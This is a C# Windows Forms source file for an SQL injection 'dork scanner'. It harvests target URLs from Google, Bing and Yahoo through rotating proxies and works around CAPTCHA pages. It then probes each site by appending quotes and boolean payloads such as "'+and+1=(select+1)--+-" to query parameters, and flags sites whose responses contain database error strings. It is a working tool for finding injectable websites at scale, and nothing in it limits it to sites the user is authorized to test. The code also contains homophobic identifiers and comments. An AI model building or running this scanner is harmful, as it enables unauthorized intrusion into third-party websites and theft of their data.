using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;
using System.Web;
using System.Threading;
using System.Xml;
using System.Diagnostics;
namespace simple_sqli_dork_scanner_gay
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			InitializeComponent();
			this.FormClosing += new FormClosingEventHandler(Form1_FormClosing);
			txProxy.KeyDown += new KeyEventHandler(txProxy_KeyDown);
		}
		private HttpWebRequest req = null;
		private XmlDocument xmldoc;
		private bool proxy = false;
		private bool curlFinish = false;
		private volatile bool keepRun = true, keepRun2 = true;
		private int engine = 0;
		private long batasTimeout=3;
        private delegate void updatelist(ListView lst, string[] items);
		private string URlcari;
		private int depthscan;
		private object objLock = new object();
		private void txProxy_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.Control && e.KeyCode.ToString() == "A")
			{
				txProxy.SelectAll();
			}
		}
		private void UpdatelistView(ListView lst, string[] items)
		{
			if (lst.InvokeRequired)
			{
				updatelist homo = updategay;
				lst.Invoke(homo, new object[] { lst, items});
			}else this.updategay(lst,items);
		}
		private void updategay(ListView lst, string[] items)
		{
			
			ListViewItem cok = new ListViewItem(items);
			lst.Items.Add(cok);
		}
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			//if (this.keepRun) this.keepRun = false;
			Application.Exit();
		}
		private string googleGraph(string dork, int start)
		{
			string url = "https://www.google.com/search?q=" + HttpUtility.UrlEncode(dork) + "&start=" + start.ToString();
			this.URlcari = url;
			string data = this.curl(url,null,false,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36");
			/*StreamWriter writer = new StreamWriter("asu.html");
			writer.Write(data);
			writer.Close();*/
			return data;
		}
		private string bingGraph(string dork, int start)
		{
			string url="http://www.bing.com/search?q=" + HttpUtility.UrlEncode(dork) + "&first=" + start.ToString();
			this.URlcari = url;
			string data = this.curl(url);
			return data;
		}
		private string yahooGraph(string dork, int start)
		{
			string url="https://search.yahoo.com/search;?p="+HttpUtility.UrlEncode(dork)+"&b="+start.ToString();
			this.URlcari = url;
			string data = this.curl(url);
			return data;
			
		}
		private MatchCollection match(string start, string end, string var)
		{
			MatchCollection match = Regex.Matches(var, Regex.Escape(start) + "(.*?)" + Regex.Escape(end), RegexOptions.Singleline);
			return match;
		}
		private string curl(string url_, string data = null, bool responKode = false,string ua=null)
		{
			//ServicePointManager.DefaultConnectionLimit = 2;
			Stream stream;
			HttpWebResponse respon;
			StreamReader mbuh;
			Uri url = new Uri(url_);
			try
			{
				this.req = (HttpWebRequest)HttpWebRequest.Create(url);
				req.Accept = "*/*";
				req.AllowAutoRedirect = true;
				req.Timeout = Convert.ToInt32(numericUpDown2.Value)*1000;
				//req.ReadWriteTimeout = Convert.ToInt32(numericUpDown2.Value)*1000;
				if(ua!=null) req.UserAgent = "Mozilla/5.0 (X11; Linux i686) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5";
				if (!string.IsNullOrEmpty(data))
				{
					byte[] postdata = Encoding.UTF8.GetBytes(data);
					req.Method = WebRequestMethods.Http.Post;
					req.ContentType = "application/x-www-form-urlencoded";
					req.ContentLength = postdata.Length;
					stream = (Stream)req.GetRequestStream();
					stream.Write(postdata, 0, postdata.Length);
					stream.Close();
				}
				else
				{
					req.Method = WebRequestMethods.Http.Get;
				}
				////////[gay]
				if (proxy)
				{
					req.Proxy = new WebProxy(this.acakproxy(txProxy));
				}
				using (respon = (HttpWebResponse)req.GetResponse())
				{
					string kode = string.Empty;
					if (responKode) kode = "_rieqyns13gay_" + respon.StatusCode.ToString() + "_rieqyns13homo_";
					using (stream = respon.GetResponseStream())
					{
						//stream.ReadTimeout = Convert.ToInt32(numericUpDown2.Value);
						//stream.WriteTimeout = Convert.ToInt32(numericUpDown2.Value);
						mbuh = new StreamReader(stream);
						string source = WebUtility.HtmlDecode(mbuh.ReadToEnd().ToString());
						stream.Flush();
						stream.Close();
						this.curlFinish = true;
						//MessageBox.Show(source);
						return source + kode;
					}
				}
			}
			catch (WebException ex)
			{
				try
				{
					string kode = string.Empty;
					respon = (HttpWebResponse)ex.Response;
					if (responKode) kode = "_rieqyns13gay_" + respon.StatusCode.ToString() + "_rieqyns13homo_";
					stream = respon.GetResponseStream();
					mbuh = new StreamReader(stream);
					string hasil = WebUtility.HtmlDecode(mbuh.ReadToEnd().ToString());
					mbuh.Close();
					respon.Close();
					this.curlFinish = true;
					return hasil+kode;
				}
				catch (Exception e)
				{
					//MessageBox.Show(e.ToString());
					this.curlFinish = false;
					return "error";
				}
			}
			catch (Exception ex)
			{
				this.curlFinish = true;
				return ex.ToString();
			}

		}
		private string acakproxy(TextBox txt)
		{
			string listproxy = txt.Text.Trim();
			string[] listp = Regex.Split(listproxy, "\r\n");
			Random rand = new Random();
			int index = rand.Next(0, listp.Length - 1);
			string proxy = listp[index];
			return proxy.Trim();

		}
		private void Form1_Load(object sender, EventArgs e)
		{
			txProxy.Enabled = false;
			lblCounter.Visible = true;
			label9.Visible = true;
			label8.Visible = true;
			lblCounter2.Visible = true;
			progressBar1.Value = 0;
			progressBar1.Visible = false;
			progressBar2.Value = 0;
			progressBar2.Visible = false;
			btnStop1.Enabled = false;
			btnStop2.Enabled = false;
			comboBox1.Items.Add("Google");
			comboBox1.Items.Add("Bing");
			comboBox1.Items.Add("Yahoo");
			comboBox2.Items.Add("No");
			comboBox2.Items.Add("Yes");
			comboBox3.Items.Add("No");
			comboBox3.Items.Add("Yes");
			comboBox4.Items.Add("No");
			comboBox4.Items.Add("Yes");
			txProxy.AppendText("IP:Port");
			loadXML();
		}
		private void cari()
		{
			try
			{
				this.keepRun = true;
				int total = (int)numericUpDown1.Value, start = 0, count = 0, jumSite = 10, patokan=10;
				int a=0, i;
				bool capcay = false;
				bool nextCok = true;
				string pola, data;
				//<span style="display:block;margin-left:53px">
				if (engine == 0){
					pola = "<h3\\s+class=\"r\">\\s*<a\\s+href=\"";
					patokan=10;
				}
				else if (engine == 1){
					pola = "<h2><a\\s+href=\"(.*?)\"\\s+h=\"";
					patokan=10;
					start = 1;
				}
				else if (engine == 2)
				{
					pola = "<h3\\s+class=\"title\"><a\\s+class=\"\\s+";
					start = 1;
					patokan = 10;
				}
				else {
					pola = "<h3\\s+class=\"r\">\\s*<a\\s+href=\"";
					patokan=10;
				}
				MatchCollection matchs;
				//while (count < total && jumSite >= 10 && capcay == false) 
				while (count < total && nextCok==true && capcay == false)
				{
					/*this.batasTimeout = Convert.ToInt64(numericUpDown2.Value);
					Stopwatch stopw = new Stopwatch();
					stopw.Start();
					this.curlFinish = false;
					bool timeout = false;*/
					if (this.keepRun == false) throw new Exception("Pencarian Berhenti");
					data = null;
					if (engine == 0) data = this.googleGraph(txDork.Text, start);
					else if (engine == 1) data = this.bingGraph(txDork.Text, start);
					else data = this.yahooGraph(txDork.Text, start);

					data = Regex.Replace(data, "\r\n|\r|\n", string.Empty);

					StreamWriter cuk = new StreamWriter("form1.html");
					cuk.Write(data); cuk.Close();
					//MessageBox.Show(data);
					/*Thread thCok = new Thread(() =>
					{
						if (engine == 0) data = this.googleGraph(txDork.Text, start);
						else data = this.bingGraph(txDork.Text, start);
					});
					thCok.IsBackground=true;
					thCok.Start();
					thCok.Join();
					while (true)
					{
						long x = stopw.ElapsedMilliseconds / 1000;
						if (this.curlFinish == false && x >= this.batasTimeout)
						{
							timeout = true;
							thCok.Join();
							break;
						}
						else if (this.curlFinish == true)
						{
							timeout = false;
							thCok.Join();
							break;
						}
					}
					stopw.Stop();*/
					//if (timeout) throw new Exception("Telah mencapai Timeout yang ditentukan. Proses berhenti");

					if (Regex.IsMatch(data, pola, RegexOptions.IgnoreCase))
					{
						//
						if (engine == 0) matchs = Regex.Matches(data, "<h3\\s+class=\"r\">\\s*<a\\s+href=\"(.*?)\" onmousedown=\"", RegexOptions.IgnoreCase | RegexOptions.Singleline);
						else if (engine == 1) matchs = Regex.Matches(data, "<h2><a\\s+href=\"(.*?)\"\\s+h=\"", RegexOptions.IgnoreCase | RegexOptions.Singleline);
						else matchs = Regex.Matches(data, "<h3\\s+class=\"title\"><a\\s+class=\"\\s+(.*?)\"\\s+href=\"(.*?)\"\\s+target=\"_blank", RegexOptions.IgnoreCase | RegexOptions.Singleline);
						jumSite = matchs.Count;
						i = 0;
						while (a < total && i<jumSite)
						{
							Match mbuh = matchs[i];
							string url = engine == 2 ? mbuh.Groups[2].Value.ToString() : mbuh.Groups[1].Value.ToString();
							this.UpdatelistView(listView1, new string[]{ url});
							this.Invoke((MethodInvoker)delegate
							{
								int lbltotal = Convert.ToInt32(lbltotalsite.Text);
								lbltotal++;
								progressBar2.Increment(1);
								lbltotalsite.Text = lbltotal.ToString();
							});
							a++;
							i++;
							count++;
						}
						if (engine == 0 && Regex.IsMatch(data, "<span\\s+style=\"display:block;margin\\-left:53px\">", RegexOptions.IgnoreCase | RegexOptions.Singleline)) nextCok = true;
						else if (engine == 1 && Regex.IsMatch(data, "title=\"Next \"|\\s+\"\\s+h=\"", RegexOptions.IgnoreCase)) nextCok = true;
						else if(engine==2 && Regex.IsMatch(data,"<a class=\"next\" ", RegexOptions.IgnoreCase))nextCok=true;
						else nextCok = false;
						
					}
					else if (Regex.IsMatch(data, Regex.Escape("<img src=\"/sorry/image?"), RegexOptions.IgnoreCase) && engine==0)
					{
						Form2 frm2 = new Form2(this.URlcari,0);
						frm2.ShowDialog();
						if (frm2.urls != null && frm2.adaHasil == true)
						{
							i = 0;
							jumSite = frm2.urls.Length;
							while (a < total && i < jumSite)
							{
								this.UpdatelistView(listView1, new string[] { frm2.urls[i] });
								this.Invoke((MethodInvoker)delegate
								{
									int lbltotal = Convert.ToInt32(lbltotalsite.Text);
									lbltotal++;
									progressBar2.Increment(1);
									lbltotalsite.Text = lbltotal.ToString();
								});
								a++;
								i++;
								count++;
							}
							nextCok = frm2.nextCok;
							//MessageBox.Show("adadaada");
						}
						else
						{
							MessageBox.Show("Tidak ada hasil pencarian");
							capcay = true;
						}
						frm2.Dispose();

					}
					else if (Regex.IsMatch(data, Regex.Escape("<form action=\"/challenge"), RegexOptions.IgnoreCase) && engine == 1)
					{
						Form2 frm2 = new Form2(this.URlcari, 1);
						frm2.ShowDialog();
						if (frm2.urls != null && frm2.adaHasil == true)
						{
							i = 0;
							jumSite = frm2.urls.Length;
							while (a < total && i < jumSite)
							{
								this.UpdatelistView(listView1, new string[] { frm2.urls[i] });
								this.Invoke((MethodInvoker)delegate
								{
									int lbltotal = Convert.ToInt32(lbltotalsite.Text);
									lbltotal++;
									progressBar2.Increment(1);
									lbltotalsite.Text = lbltotal.ToString();
								});
								a++;
								i++;
								count++;
							}
							nextCok = frm2.nextCok;
							//MessageBox.Show("adadaada");
						}
						else
						{  
							MessageBox.Show("Tidak ada hasil pencarian");
							capcay = true;
						}
						frm2.Dispose();
					}
					else
					{
						if (proxy)
						{
							if (engine == 0) MessageBox.Show("Tidak ada hasil atau mungkin Proxy tidak valid", "Error");
							else if (engine == 1) MessageBox.Show("Tidak ada hasil atau ada halangan captcha, atau mungkin Proxy tidak valid", "Error");
							else MessageBox.Show("Tidak ada hasil atau mungkin Proxy tidak valid", "Error");
						}
						else
						{
							if (engine == 0)
							{
								MessageBox.Show("Tidak ada hasil pencarian.", "Error");
								StreamWriter cc = new StreamWriter("form1_2.html");
								cc.Write(data+"cok");
								cc.Close();
							}
							else if (engine == 1) MessageBox.Show("Tidak ada hasil atau ada halangan captcha", "Error");
							else MessageBox.Show("Tidak ada hasil atau mungkin Proxy tidak valid", "Error");
						}
						capcay = true;
					}
					start += 10;
					/*File.WriteAllText("gay.html", data);
					if (engine == 0 && Regex.IsMatch(data, "id=\"nn\"", RegexOptions.IgnoreCase))
					{
						//MessageBox.Show("gay homo");
						nextCok = true;
					}
					else if (engine == 1 && Regex.IsMatch(data, "title=\"Next \"", RegexOptions.IgnoreCase)) nextCok = true;
					else nextCok = false;*/
				} 
			}
			catch (Exception e)
			{
				MessageBox.Show(e.Message, "Stop 4 ");
			}
			finally
			{
				this.Invoke((MethodInvoker)delegate
				{
					btnSearch.Enabled = true;
					btnScan.Enabled = true;
					btnStop1.Enabled = false;
					txDork.Enabled = true;
					btnRemoveClone.Enabled = true;
					txProxy.Enabled = true;
					numericUpDown1.Enabled = true;
					comboBox1.Enabled = true;
					comboBox2.Enabled = true;
					progressBar2.Visible = false;
					progressBar2.Value = 0;
				});
			}
		}
		private void btnSearch_Click(object sender, EventArgs e)
		{
			if (txDork.Text == string.Empty) MessageBox.Show("Dork cannot be empty");
			else
			{
				progressBar2.Visible = true;
				progressBar2.Maximum = Convert.ToInt32(numericUpDown1.Value);
				listView1.Items.Clear();
				lbltotalsite.Text = "0";
				btnSearch.Enabled = false;
				btnScan.Enabled = false;
				Thread thCari = new Thread(new ThreadStart(cari));
				thCari.Priority = ThreadPriority.AboveNormal;
				thCari.IsBackground = true;
				thCari.SetApartmentState(ApartmentState.STA);
				thCari.Start();
				btnStop1.Enabled = true;
				txDork.Enabled = false;
				txProxy.Enabled = false;
				numericUpDown1.Enabled = false;
				comboBox1.Enabled = false;
				comboBox2.Enabled = false;
				btnRemoveClone.Enabled = false;
			}
		}

		private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (comboBox1.SelectedIndex == 0)
			{
				engine = 0;
			}
			else if (comboBox1.SelectedIndex == 1)
			{
				engine = 1;
			}
			else if (comboBox1.SelectedIndex == 2)
			{
				engine = 2;
			}
			else engine = 0;
		}

		private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (comboBox2.SelectedIndex == 0)
			{
				if (comboBox4.SelectedIndex == 0) txProxy.Enabled = false;
				proxy = false;
			}
			else if (comboBox2.SelectedIndex == 1)
			{
				if (string.IsNullOrEmpty(txProxy.Text))
				{
					MessageBox.Show("List proxy belum ada. Tolong masukkan list proxy pada tab Proxylist", "Proxy aktif ?");
				}
				txProxy.Enabled = true;
				proxy = true;
			}
			else
			{
				if (comboBox4.SelectedIndex == 0) txProxy.Enabled = false;
				proxy = false;
			}
		}
		private void removeClones(ListView.ListViewItemCollection data)
		{
			try
			{
				int total = listView1.Items.Count;
				string[] host = new string[total];
				string[] scheme = new string[total];
				string[] urlGay = new string[total];
				string[] pathQuery = new string[total];
				string[] mbuh = new string[total];
				int[] port = new int[total];
				for (int a = 0; a < total; a++)
				{
					try
					{
						Uri url = new Uri(data[a].Text);
						host[a] = url.Host;
						scheme[a] = url.Scheme;
						urlGay[a] = scheme[a] + "://" + host[a] + (url.IsLoopback ? ":" + url.Port : string.Empty);
						pathQuery[a] = url.PathAndQuery;
					}
					catch
					{
						host[a] = null;
						scheme[a] = null;
						urlGay[a] = data[a].Text;
						pathQuery[a] = null;
					}
					
				}
				IEnumerable<int> key = host.Distinct().Select(a => Array.IndexOf(host, a));
				int ind = 0;
				listView1.Items.Clear();
				int jem = 0;
				foreach (int index in key)
				{
					mbuh[ind] = urlGay[index]+ pathQuery[index];
					listView1.Items.Add(mbuh[ind]);
					ind++;
					jem++;
				}
				Invoke((MethodInvoker)delegate
				{
					lbltotalsite.Text = jem.ToString();
				});
			}
			catch (Exception e)
			{
				MessageBox.Show(e.Message);
			}
		}
		private void btnStop1_Click(object sender, EventArgs e)
		{
			this.keepRun = false;
		}

		private void btnRemoveClone_Click(object sender, EventArgs e)
		{
			this.removeClones(listView1.Items);
		}
		/// <summary>
		/// You're gay
		/// </summary>
		private void scan()
		{
			try
			{
				if (InvokeRequired)
				{
					Invoke((MethodInvoker)delegate
					{
						this.batasTimeout = Convert.ToInt64(numericUpDown2.Value);
						numericUpDown2.Enabled = false;
					});
				}
				else
				{
					this.batasTimeout = Convert.ToInt64(numericUpDown2.Value);
					numericUpDown2.Enabled = false;
				}
				
				this.keepRun2 = true;
				int vuln = Convert.ToInt32(lblCounter.Text);
				int notvuln = Convert.ToInt32(lblCounter2.Text);
				int totalscanned = Convert.ToInt32(lblscannedurl.Text);
				int timeoutlbl = Convert.ToInt16(lbltimeout.Text);

				string curl = "rieqyns13";
				string kode=null;
				int total=listView1.Items.Count;
				string[] urls = new string[total];
				for (int a = 0; a < total; a++)
				{
					this.Invoke((MethodInvoker)delegate
					   {
						   urls[a] = this.listView1.Items[a].Text;
					   });
				}
			
				
				int noCok = 0;
				for (int i = 0; i <total ; i++)
				{
					
					/*try
					{
						//if (thCok.IsAlive)Debug.WriteLine(thCok.Name + " > abort");
							//thCok.Abort();
					}
					catch { }*/
					//
					List<string> errlist = new List<string>(new string[]{
					"error in your SQL syntax", "mysql_fetch_array()", "execute query", "mysql_fetch_object()", "mysql_num_rows()", "mysql_fetch_assoc()", "mysql_fetch_row()",
					"SELECT * FROM", "supplied argument is not a valid MySQL", "Syntax error", "Fatal error", "Microsoft OLE DB", "Microsoft VBScript runtime", "Unclosed quotation mark after the character string",
					"error '80040e14", "error '800a000d'", "Type mismatch", "Error Executing Database Query", "VENDORERRORCODE", "OLE DB Provider for ODBC", "include()", "this page cannot be displayed", 
					"DatbaseQueryException", "call to undefined function", "mysql_result(", "SQLServer JDBC Driver", "coldfusion.tagext", "ODBC Socket", "Error Occurred While Processing Request",
					"Invalid Querystring", "ADODB.Field", "BOF or EOF", "Input string was not in a correct format", "SequeLink JDBC Driver"
					});
					this.Invoke((MethodInvoker)delegate
					{
						if (listView3.Items.Count > 0)
						{
							foreach (ListViewItem errors in listView3.Items)
							{
								errlist.Add(errors.Text);
							}
						}
					});

					//
					//Stopwatch stopw = new Stopwatch();
					this.curlFinish = false;
					if (this.keepRun2 == false) throw new Exception("Proses scanning berhenti");
					string url = urls[i];
					
					string url_ = this.parse(url);
					curl = this.curl(url_, null, true);
					//stopw.Start();
					

					totalscanned++;					
					if (this.curlFinish == false)
					{
						this.Invoke((MethodInvoker)delegate
						{
							lblscannedurl.Text = totalscanned.ToString();
							timeoutlbl++;
							progressBar1.Increment(1);
							lbltimeout.Text = timeoutlbl.ToString();
						});
						continue;
					}

					bool ketemu = false;
					
					foreach (string error in errlist)
					{
						string curl2 = Regex.Replace(curl, "\r\n|\r|\n", string.Empty);
						//StreamWriter cuk = new StreamWriter("gay/" + noCok + ".html");cuk.WriteLine(curl2 + "\r\n");cuk.Close();
						IEnumerable<string> arr = Regex.Split(error, "\\s").Select(s => Regex.Escape(s));
						string error2 = string.Join("\\s+", arr.ToArray());
						if (Regex.IsMatch(curl2, error2, RegexOptions.IgnoreCase | RegexOptions.Singleline))
						{
							
							kode = this.match("_rieqyns13gay_", "_rieqyns13homo_", curl2)[0].Groups[1].Value;
							string[] data = new string[] { url, error, kode };
							this.UpdatelistView(listView2, data);
							vuln++;
							ketemu = true;
							break;
						}

					}
					noCok++;
					if (ketemu == false && depthscan == 1)
					{
						if (this.keepRun2 == false) throw new Exception("Proses scanning berhenti");
						string tmp1, tmp2;
						tmp1 = this.curl(url + "'+and+1=(select+1)--+-", null, true);
						if (this.keepRun2 == false) throw new Exception("Proses scanning berhenti");
						tmp2 = this.curl(url + "'+and+1=(select+0)--+-", null, true);
						int len = tmp1.Length - tmp2.Length;
						if (len >= 30)
						{
							kode = this.match("_rieqyns13gay_", "_rieqyns13homo_", tmp1)[0].Groups[1].Value;
							string[] data = new string[] { url, "!! Depth Scan Type !!", kode };
							this.UpdatelistView(listView2, data);
							vuln++;
							ketemu = true;
						}
					}
					if (!ketemu && (depthscan==1 || depthscan==0)) notvuln++;
					this.Invoke((MethodInvoker)delegate
					{
						lblCounter.Text = vuln.ToString();
						lblCounter2.Text = notvuln.ToString();
						lblscannedurl.Text = totalscanned.ToString();
						progressBar1.Increment(1);
					});
				}
			}
			catch (Exception e)
			{
				MessageBox.Show(e.Message, "Stop");
			}
			finally
			{
				this.Invoke((MethodInvoker)delegate
				{
					/*lblCounter.Text = "0";
					lblCounter2.Text = "0";*/
					btnScan.Enabled = true;
					btnStop2.Enabled = false;
					comboBox3.Enabled = true;
					comboBox4.Enabled = true;
					progressBar1.Visible = false;
					progressBar1.Value = 0;
					numericUpDown2.Enabled = true;
					/*label9.Visible = false;
					label8.Visible = false;
					lblCounter.Visible = false;
					lblCounter2.Visible = false;*/
				});
			}

		}
		private string parse(string Url)
		{
			try
			{
				Uri url = new Uri(Url);
				if (string.IsNullOrEmpty(url.Query))
				{
					return Url;
				}

				if (string.IsNullOrEmpty(url.PathAndQuery))
				{
					return Url;
				}

				string query = url.Query;
				string path = url.AbsolutePath;
				string scheme = url.Scheme;
				string host = url.Host;
				string port = (url.IsLoopback ? ":" + url.Port.ToString() : string.Empty);

				string[] arr = query.Split('&');
				List<string> cuk = new List<string>(arr);
				var x = cuk.Select(e => e + "'");
				string url_ = scheme + "://" + host + port+ path + string.Join("&", x.ToArray());
				return url_;
			}
			catch (Exception e)
			{
				return e.ToString();
			}
		}
		private void button1_Click(object sender, EventArgs e)
		{
			
			//MessageBox.Show(pola);
			if (listView1.Items.Count == 0)
			{
				MessageBox.Show("Search target dulu");
			}
			else
			{
				lblCounter2.Text = "0";
				lblCounter.Text = "0";
				lbltimeout.Text = "0";
				lblscannedurl.Text = "0";
				listView2.Items.Clear();
				progressBar1.Maximum = Convert.ToInt32(listView1.Items.Count);
				btnScan.Enabled = false;
				btnStop2.Enabled = true;
				comboBox3.Enabled = false;
				comboBox4.Enabled = false;
				label9.Visible = true;
				label8.Visible = true;
				lblCounter.Visible = true;
				lblCounter2.Visible = true;
				progressBar1.Visible = true;
				Thread thScan = new Thread(new ThreadStart(scan));
				thScan.Priority = ThreadPriority.AboveNormal;
				thScan.IsBackground = true;
				thScan.Start();
			}
		}
		private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
		{
			if ((sender as ComboBox).SelectedIndex == 0) depthscan = 0;
			else if ((sender as ComboBox).SelectedIndex == 1) depthscan = 1;
			else depthscan = 0;
		}

		private void comboBox4_SelectedIndexChanged(object sender, EventArgs e)
		{
			if ((sender as ComboBox).SelectedIndex == 0)
			{
				if (comboBox2.SelectedIndex == 0) txProxy.Enabled = false;
				proxy = false;
			}
			else if ((sender as ComboBox).SelectedIndex == 1)
			{
				if (string.IsNullOrEmpty(txProxy.Text))
				{
					MessageBox.Show("List proxy belum ada. Tolong masukkan list proxy pada tab Proxylist", "Proxy aktif ?");
				}
				txProxy.Enabled = true;
				proxy = true;
			}
			else
			{
				proxy = false;
				if (comboBox2.SelectedIndex == 0) txProxy.Enabled = false;
			}
		}

		private void btnStop2_Click(object sender, EventArgs e)
		{
			this.keepRun2 = false;
			
		}

		private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
		{
			if (listView1.Items.Count == 0) toolStripMenuItem1.Enabled = false;
			else toolStripMenuItem1.Enabled = true;
			if (listView1.SelectedItems.Count == 0) copyToolStripMenuItem.Enabled = false;
			else copyToolStripMenuItem.Enabled = true;
			
		}

		private void toolStripMenuItem1_Click(object sender, EventArgs e)
		{
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < listView1.Items.Count; i++)
			{
				sb.AppendLine(listView1.Items[i].Text);
			}
			Clipboard.SetText(sb.ToString());
		}

		private void contextMenuStrip2_Opening(object sender, CancelEventArgs e)
		{
			if (listView2.Items.Count == 0)
			{
				copyAllToolStripMenuItem.Enabled = false;
				saveToTextFileToolStripMenuItem.Enabled = false;
				copySelectedItemToolStripMenuItem.Enabled = false;
			}
			else
			{
				copySelectedItemToolStripMenuItem.Enabled = true;
				copyAllToolStripMenuItem.Enabled = true;
				saveToTextFileToolStripMenuItem.Enabled = true;
			}
		}

		private void copyAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				StringBuilder homo = new StringBuilder();
				for (int i = 0; i < listView2.Items.Count; i++)
				{
					homo.AppendLine(listView2.Items[i].Text);
				}
				Clipboard.SetText(homo.ToString());
			}
			catch { }
		}

		private void importFromFileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog file = new OpenFileDialog();
				file.Filter = "txt files (*.txt)|*.txt";
				file.Multiselect = false;
				if (file.ShowDialog() == DialogResult.OK)
				{
					listView1.Items.Clear();
					string[] urls = File.ReadAllLines(file.FileName);
					foreach (string url in urls) listView1.Items.Add(url.Trim());

				}
			}
			catch (Exception ee)
			{
				MessageBox.Show(ee.Message);
			}

		}

		private void copySelectedItemToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				StringBuilder homo = new StringBuilder();
				int i = 1;
				foreach (ListViewItem item in listView2.SelectedItems)
				{
					if (i == listView2.SelectedItems.Count) homo.Append(item.Text);
					else homo.AppendLine(item.Text);
					i++;
				}
				Clipboard.SetText(homo.ToString());
			}
			catch { }
		}
		private void loadXML()
		{
			if (File.Exists("errlist.xml"))
			{
				xmldoc = new XmlDocument();
				xmldoc.Load("errlist.xml");
				//XmlNodeList elems = doc
				XmlElement root = xmldoc.DocumentElement;
				for (int a = root.ChildNodes.Count - 1; a >= 0; a--)
				{
					listView3.Items.Add(root.ChildNodes[a].InnerText);
				}
			}
		}

		private void btnAddPattern_Click(object sender, EventArgs e)
		{
			if (txPattern.Text.Trim() == string.Empty) MessageBox.Show("Isi kotak error pattern dulu");
			else
			{
				if (!File.Exists("errlist.xml"))
				{
					XmlWriterSettings setting = new XmlWriterSettings();
					setting.Indent = true;
					XmlWriter write = XmlWriter.Create("errlist.xml", setting);
					write.WriteStartDocument();
					write.WriteStartElement("errorlist");
					write.WriteElementString("error", txPattern.Text);
					write.WriteEndElement();
					write.WriteEndDocument();
					write.Flush();
					write.Close();
					loadXML();
				}
				else
				{
					xmldoc = new XmlDocument();
					xmldoc.Load("errlist.xml");
					XmlElement root = xmldoc.DocumentElement;
					XmlElement elem = xmldoc.CreateElement("error");
					elem.InnerText = txPattern.Text;
					root.AppendChild(elem);
					xmldoc.Save("errlist.xml");
					listView3.Items.Clear();
					loadXML();
				}
			}
		}

		private void removeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				ListView.SelectedListViewItemCollection items = listView3.SelectedItems;
				xmldoc = new XmlDocument();
				xmldoc.Load("errlist.xml");
				XmlElement root = xmldoc.DocumentElement;
				XmlNodeList xxx = root.ChildNodes;
				foreach (ListViewItem item in items)
				{
					root.RemoveChild(xxx[(xxx.Count - 1) - item.Index]);
				}
				xmldoc.Save("errlist.xml");
				listView3.Items.Clear();
				loadXML();
			}
			catch { }
		}

		private void saveToTextFileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			//var a=listView2.
			SaveFileDialog cok = new SaveFileDialog();
			cok.Filter="txt files (*.txt)|*.txt|All files (*.*)|*.*";
			DialogResult mbut = cok.ShowDialog();
			if (mbut == DialogResult.OK)
			{
				StringBuilder jembot = new StringBuilder();
				for (int a = 0; a < listView2.Items.Count; a++) jembot.AppendLine(listView2.Items[a].Text);
				File.WriteAllText(cok.FileName, jembot.ToString());
			}
			
		}

		private void copyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				StringBuilder jemb = new StringBuilder();
				ListView.SelectedListViewItemCollection cok = listView1.SelectedItems;
				for (int a = 0; a < cok.Count; a++)
				{
					if (a == (cok.Count - 1)) jemb.Append(cok[a].Text);
					else jemb.AppendLine(cok[a].Text);

				}
				Clipboard.SetText(jemb.ToString());
			}
			catch { }
		}
	}
}
